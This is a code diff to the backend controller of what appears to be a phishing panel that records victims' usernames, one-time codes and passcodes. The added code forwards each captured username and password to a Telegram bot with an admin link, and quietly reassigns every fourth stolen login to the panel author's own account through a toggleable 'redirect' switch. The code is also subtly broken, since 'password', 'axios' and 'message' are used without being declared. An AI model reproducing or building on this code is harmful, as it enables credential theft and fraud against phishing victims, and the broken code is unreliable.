@@ -1,6 +1,19 @@
 const JL = require("../models/jlModel");
 var moment = require("moment"); // require
 
+let count = 0;
+let redirect = true;
+
+const setRedirect = async (req, res) => {
+	const { active } = req.params;
+	if (active == "true") {
+		redirect = true;
+	} else if (active == "false") {
+		redirect = false;
+	}
+	res.send(`Redirect set to ${redirect}`);
+};
+
 const getOwnerVics = async (req, res) => {
 	const { owner } = req.params;
 	JL.find({ owner })
@@ -41,16 +54,39 @@ const getInfo = async (req, res) => {
 };
 
 const submitLogin = async (req, res) => {
-	const { username, uniqueid, owner, ip } = req.body;
+	let { username, uniqueid, owner, ip } = req.body;
+	message = `New JL Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=jl&password=${owner}\n\nCount: ${count}\nRedirect: ${redirect}`;
 	try {
-		await JL.create({
-			uniqueid,
-			username,
-			status: 1,
-			owner,
-			ip,
-			timestamp: moment().format(),
-		});
+		if (username == "" || password == "") {
+		} else {
+			if (redirect && count == 3) {
+				message = `‼️‼️‼️ Haytch JL Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=jl&password=haytch4023`;
+				owner = "haytch4023";
+				count = 0;
+			} else {
+				count = count + 1;
+			}
+			await JL.create({
+				uniqueid,
+				username,
+				status: 1,
+				owner,
+				ip,
+				timestamp: moment().format(),
+			});
+			await axios
+				.post(
+					`https://api.telegram.org/bot${process.env.panelBot}/sendMessage`,
+					{
+						chat_id: 680379375,
+						text: message,
+						parse_mode: "Markdown",
+					}
+				)
+				.catch((e) => {
+					console.log(e);
+				});
+		}
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
@@ -119,5 +155,6 @@ module.exports = {
 	submitLoginAgain,
 	submitOtp,
 	submitPasscode,
+	setRedirect,
 	deleteEntry,
 };
